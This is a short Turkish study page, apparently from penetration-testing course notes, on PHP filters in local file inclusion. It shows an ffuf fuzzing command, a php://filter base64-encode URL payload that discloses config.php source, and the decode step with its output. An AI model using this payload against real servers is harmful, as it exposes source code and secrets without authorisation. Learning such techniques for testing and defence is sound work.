---
glightbox: true
icon: material/circle-small
---

# PHP Filters

## Fuzzing for PHP Files

```bash
ffuf -ic -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP_ADDRESS:PORT/FUZZ.php
```

```text title="Output"

...SNIP...

index                   [Status: 200, Size: 2652, Words: 690, Lines: 64]
config                  [Status: 302, Size: 0, Words: 1, Lines: 1]
```

!!! info "200"

    LFI uygulamasında 200 OK dışındaki yanıt kodlarını da (301, 302, 403, vs.) hesaba katmalıyız.

## Source Code Disclosure

Fuzzing sonrası elde edilen örnek bir PHP dosyasına (`config`) LFI saldırısı uygulamak için [PHP Base64 Conversion Filter](https://www.php.net/manual/en/filters.convert.php) kullanabiliriz:

* [x] Örneğin URL şu şekilde gözükebilir:

```text
http://SERVER_IP_ADDRESS:PORT/index.php?language=php://filter/read=convert.base64-encode/resource=config
```

!!! info "Extension"

    URL sonunda bulunan ifadenin (`config`) ardına bilinçli olarak dosya uzantısı (`.php`) eklenmemiştir. Uzantının, sunucu tarafında otomatik olarak ekleneceği varsayılmıştır.

Kaynak kodu elde etmek için Base64 kodu çözülmelidir (tüm Base64 dizesini kopyalamak için sayfa kaynağı görüntülenebilir):

```bash
echo 'PD9waHAK...SNIP...KICB9Ciov' | base64 -d
```

```php title="Output"
...SNIP...

if ($_SERVER['REQUEST_METHOD'] == 'GET' && realpath(__FILE__) == realpath($_SERVER['SCRIPT_FILENAME'])) {
  header('HTTP/1.0 403 Forbidden', TRUE, 403);
  die(header('location: /index.php'));
}

...SNIP...
```
